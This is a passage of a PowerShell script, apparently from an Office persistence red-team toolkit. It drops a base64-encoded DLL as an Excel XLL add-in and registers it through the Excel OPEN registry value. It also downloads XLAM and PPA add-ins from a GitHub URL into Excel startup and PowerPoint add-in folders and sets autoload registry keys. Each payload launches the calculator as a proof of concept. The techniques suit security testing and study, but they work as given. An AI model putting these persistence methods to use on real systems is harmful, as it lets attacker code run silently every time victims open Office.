    # Release file： %appdata%\Microsoft\AddIns\calc.xll
    # Create registry key:HKCU\Software\Microsoft\Office\15.0\Excel\Options OPEN REG_SZ "/R calc.xll"
    # Pop up the calculator when you start excel.exe
    $OfficePath="C:\Program Files\Microsoft Office\"+"Office*"
    Try  
    {  
        $OfficeVersion=dir -name $OfficePath -ErrorAction Stop  
        $Ver=$OfficeVersion.Substring( $OfficeVersion.LastIndexOf("e")+1 )
        Write-Host "Microsoft Office Version:" $Ver        
    }  
    Catch  
    {  
        Write-Host "[!] I can't find Microsoft Office!" 
        Write-Host "[+] Please reset a correct path." 
        return 
    }  
    $fileContent = "TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAyAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAADVzTnZkaxXipGsV4qRrFeKebNdipWsV4qRrFaKlqxXivOzRIqSrFeKebNcipOsV4p5s1OKkqxXilJpY2iRrFeKAAAAAAAAAABQRQAATAEEAF0ZaFkAAAAAAAAAAOAADiELAQYAAAIAAAAGAAAAAAAAyxAAAAAQAAAAIAAAAAAAEAAQAAAAAgAABAAAAAAAAAAEAAAAAAAAAABQAAAABAAAAAAAAAIAAAAAABAAABAAAAAAEAAAEAAAAAAAABAAAADQIAAARwAAABwgAAA8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAADQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAAHAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC50ZXh0AAAAbgEAAAAQAAAAAgAAAAQAAAAAAAAAAAAAAAAAACAAAGAucmRhdGEAABcBAAAAIAAAAAIAAAAGAAAAAAAAAAAAAAAAAABAAABALmRhdGEAAAAwAAAAADAAAAACAAAACAAAAAAAAAAAAAAAAAAAQAAAwC5yZWxvYwAAWgAAAABAAAAAAgAAAAoAAAAAAAAAAAAAAAAAAEAAAEIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGoBaBAwABD/FQAgABDDkJC4AQAAAMIMAJCQkJCQkJCQi0QkCIXAdQ45BRwwABB+Lv8NHDAAEIsNFCAAEIP4AYsJiQ0gMAAQdT9ogAAAAP8VECAAEIXAWaMoMAAQdQQzwOtmgyAAoSgwABBoBDAAEGgAMAAQoyQwABDo6gAAAP8FHDAAEFlZ6z2FwHU5oSgwABCFwHQwiw0kMAAQVo1x/DvwchKLDoXJdAf/0aEoMAAQg+4E6+pQ/xUIIAAQgyUoMAAQAFleagFYwgwAVYvsU4tdCFaLdQxXi30QhfZ1CYM9HDAAEADrJoP+AXQFg/4CdSKhLDAAEIXAdAlXVlP/0IXAdAxXVlPoFf///4XAdQQzwOtOV1ZT6PX+//+D/gGJRQx1DIXAdTdXUFPo8f7//4X2dAWD/gN1JldWU+jg/v//hcB1AyFFDIN9DAB0EaEsMAAQhcB0CFdWU//QiUUMi0UMX15bXcIMAP8lDCAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAdCAAAAAAAACMIAAAlCAAAKAgAACqIAAAAAAAAFggAAAAAAAAAAAAAH4gAAAAIAAAYCAAAAAAAAAAAAAAuiAAAAggAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHQgAAAAAAAAjCAAAJQgAACgIAAAqiAAAAAAAADTAldpbkV4ZWMAS0VSTkVMMzIuZGxsAABeAmZyZWUAAA8BX2luaXR0ZXJtAJECbWFsbG9jAACdAF9hZGp1c3RfZmRpdgAATVNWQ1JULmRsbAAAAAAAAAAAAAAAAAAAAABdGWhZAAAAAAIhAAABAAAAAQAAAAEAAAD4IAAA/CAAAAAhAAAAEAAADCEAAAAAdGVzdDMuZGxsAHhsQXV0b09wZW4AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAY2FsYy5leGUAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAA0AAAAAzAJMCowMjA4MEMwUDBYMGYwazBwMHUwgDCNMJcwrDC4ML4w4DDyME4xajEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    $fileContentBytes = [System.Convert]::FromBase64String($fileContent) 
    [System.IO.File]::WriteAllBytes($env:APPDATA+"\Microsoft\AddIns\calc.xll",$fileContentBytes)
    $ExcelRegPath="HKCU:\Software\Microsoft\Office\"+$Ver+".0\Excel\"
    New-Item -type Directory $ExcelRegPath"Options" | Out-Null
    New-ItemProperty $ExcelRegPath"Options" OPEN -value "/R calc.xll" -propertyType string | Out-Null
}

Function ExcelVBAadd-ins
{
    # Use VBA add-ins for Excel
    # Release file：%appdata%\Microsoft\Excel\XLSTART\calc.xlam
    # Pop up the calculator when you start excel.exe
    $OfficePath="C:\Program Files\Microsoft Office\"+"Office*"
    Try  
    {  
        $OfficeVersion=dir -name $OfficePath -ErrorAction Stop  
        $Ver=$OfficeVersion.Substring( $OfficeVersion.LastIndexOf("e")+1 )
        Write-Host "Microsoft Office Version:" $Ver    
    }  
    Catch  
    {  
        Write-Host "[!] I can't find Microsoft Office!" 
        Write-Host "[+] Please reset a correct path." 
        return 
    }        
    $client = new-object System.Net.WebClient
    $client.DownloadFile("https://raw.githubusercontent.com/3gstudent/Office-Persistence/master/calc.xlam",$env:APPDATA+"\Microsoft\Excel\XLSTART\calc.xlam")
}

Function PowerPointVBAadd-ins
{
    # Use add-ins for PowerPoint
    # Release file：%appdata%\Microsoft\AddIns\calc.ppa
    # Create registry key:HKCU\Software\Microsoft\Office\14.0\PowerPoint\AddIns\calc Autoload DWORD 1
    # Create registry key:HKCU\Software\Microsoft\Office\14.0\PowerPoint\AddIns\calc Path REG_SZ calc.ppa
    # Pop up the calculator when you start powerpoint.exe
    $OfficePath="C:\Program Files\Microsoft Office\"+"Office*" 
    Try  
    {  
        $OfficeVersion=dir -name $OfficePath -ErrorAction Stop  
        $Ver=$OfficeVersion.Substring( $OfficeVersion.LastIndexOf("e")+1 )
        Write-Host "Microsoft Office Version:" $Ver        
    }  
    Catch  
    {  
        Write-Host "[!] I can't find Microsoft Office!" 
        Write-Host "[+] Please reset a correct path." 
        return 
    }  
    $client = new-object System.Net.WebClient
    $client.DownloadFile("https://raw.githubusercontent.com/3gstudent/Office-Persistence/master/calc.ppa",$env:APPDATA+"\Microsoft\AddIns\calc.ppa")
    $ExcelRegPath="HKCU:\Software\Microsoft\Office\"+$Ver+".0\PowerPoint\"
    New-Item -type Directory $ExcelRegPath"AddIns" | Out-Null
    New-Item -type Directory $ExcelRegPath"AddIns\calc" | Out-Null
    New-ItemProperty $ExcelRegPath"AddIns\calc" Autoload -value "1" -propertyType DWORD | Out-Null
    New-ItemProperty $ExcelRegPath"AddIns\calc" Path -value "calc.ppa" -propertyType string | Out-Null
}
